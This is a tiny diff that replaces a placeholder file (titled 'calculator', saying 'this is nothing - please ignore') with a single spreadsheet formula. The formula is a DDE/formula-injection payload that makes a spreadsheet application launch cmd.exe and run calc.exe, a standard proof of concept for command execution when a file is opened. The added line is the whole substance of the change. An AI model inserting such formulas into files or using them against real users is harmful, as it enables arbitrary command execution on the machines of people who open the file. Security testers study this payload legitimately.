@@ -1,2 +1,1 @@
-# calculator
-this is nothing - please ignore
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''
